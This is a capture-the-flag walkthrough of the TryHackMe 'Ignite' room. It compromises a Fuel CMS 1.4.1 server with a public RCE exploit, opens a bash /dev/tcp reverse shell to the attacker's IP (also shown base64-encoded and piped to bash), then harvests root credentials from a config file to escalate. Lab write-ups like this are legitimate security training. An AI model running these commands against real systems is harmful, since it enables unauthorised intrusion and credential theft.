🛡️ TryHackMe Walkthrough – Ignite
🎯 Room: Ignite
👨‍💻 Author: Sujal
🧪 Difficulty: Easy
📍 Target IP: 10.49.183.118
🧠 Overview

In this room, we exploited a vulnerable Fuel CMS instance to gain:

Remote Code Execution (RCE)
Reverse shell access
Privilege escalation to root via credential reuse
🔍 Step 1: Nmap Scan
nmap -sC -sV 10.49.183.118
📌 Output:
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
🧠 Analysis:
Only port 80 (HTTP) is open
robots.txt reveals hidden path: /fuel/
🌐 Step 2: Web Enumeration

Access:

http://10.49.183.118/fuel/

We discover:

Fuel CMS login panel
🔍 Step 3: Hidden Path Discovery

Found encoded URL:

/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d
🔓 Step 4: Decode Hidden Value
Convert HEX → ASCII:
echo 5a6e566c6243396b59584e6f596d3968636d513d | xxd -r -p
ZnVlbC9kYXNoYm9hcmQ=
Decode Base64:
echo ZnVlbC9kYXNoYm9hcmQ= | base64 -d
fuel/dashboard
🧠 Result:

Hidden redirect path → /fuel/dashboard

💣 Step 5: Exploit Fuel CMS (RCE)
Search exploit:
searchsploit fuel cms
Output:
Fuel CMS 1.4.1 - Remote Code Execution (3) | php/webapps/50477.py
Copy exploit:
searchsploit -m 50477
Run exploit:
python3 50477.py -u http://10.49.183.118
🧪 Step 6: Command Execution
Enter Command $ id
systemuid=33(www-data) gid=33(www-data)
Enter Command $ whoami
systemwww-data
🧠 Result:

✔ Remote Code Execution confirmed

🐚 Step 7: Reverse Shell
🎧 Start listener:
nc -lvnp 4444
Encode payload:
echo "bash -i >& /dev/tcp/192.168.160.102/4444 0>&1" | base64
Execute payload:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2MC4xMDIvNDQ0NCAwPiYxCg== | base64 -d | bash
🐚 Shell obtained:
www-data@ubuntu:/var/www/html$
🔧 Step 8: Stabilize Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
🔍 Step 9: Credential Harvesting

Navigate:

cd /var/www/html/fuel/application/config
ls
Read config:
cat database.php
Output:
'username' => 'root',
'password' => 'mememe',
🔐 Step 10: Privilege Escalation
su root

Password:

mememe
Verify:
whoami
root
👑 Step 11: Capture Flags
Root flag:
cat /root/root.txt
[REDACTED]
User flag:
cat /home/www-data/flag.txt
[REDACTED]
🧠 Key Takeaways
Always check robots.txt for hidden paths
Encoding (HEX + Base64) is common in CTF
Fuel CMS 1.4.1 is vulnerable to RCE
Config files often leak credentials
Developers reuse passwords → easy privilege escalation
